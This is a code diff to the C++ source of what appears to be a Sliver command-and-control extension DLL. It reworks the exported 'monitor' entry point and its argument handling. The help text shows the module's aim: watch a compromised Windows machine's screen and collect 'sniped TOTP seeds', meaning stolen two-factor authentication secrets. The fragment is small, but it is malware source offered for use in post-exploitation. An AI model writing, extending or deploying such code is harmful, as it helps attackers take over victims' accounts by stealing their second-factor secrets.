@@ -1,18 +1,13 @@
 #include "WinMsgHandler.h"
 
-// Sliver Extension Entrypoint definition
-typedef int (*goCallback)(const char*, int);
-extern "C" {
-	__declspec(dllexport) int __cdecl monitor(char* argsBuffer, uint32_t bufferSize, goCallback callback);
-}
-
+// Sliver Extension callback definition
+typedef int (__stdcall * goCallback)(const char*, int); // __stdcall needed for WIN32 and golang, ignored in WIN64
 
 //State Tracking Between calls
 bool winPumpRunning = false;
 std::unique_ptr<std::thread> winPump{ nullptr };
 std::shared_ptr<SharedQueue> _queue{ nullptr };
 std::unique_ptr<WinMsgHandler> msg_handler{ nullptr };
-
 
 static void startWinPump(){
 	msg_handler = std::make_unique<WinMsgHandler>(_queue); //Create our window to capture messages
@@ -40,11 +35,12 @@ static std::string utf8_encode(const std::wstring& wstr)
 	return strTo;
 }
 
-int monitor(char* argsBuffer, uint32_t bufferSize, goCallback callback) {
+extern "C" __declspec(dllexport) int __cdecl monitor(char* argsBuffer, uint32_t bufferSize, goCallback callback) {
 	int cmd = -1;
-	if (bufferSize < 1) {
+	if (bufferSize != 1) {
 		std::string msg{ "You must provide a command.\n\t0 = stop\n\t1 = start monitoring screen\n\t2 = get sniped TOTP seeds" };
 		callback(msg.c_str(), msg.length());
+		return 0;
 	}
 	else
 		cmd = argsBuffer[0] - '0'; // atoi would return 0 if it couldn't convert, this will only return 0 if the first char is 0
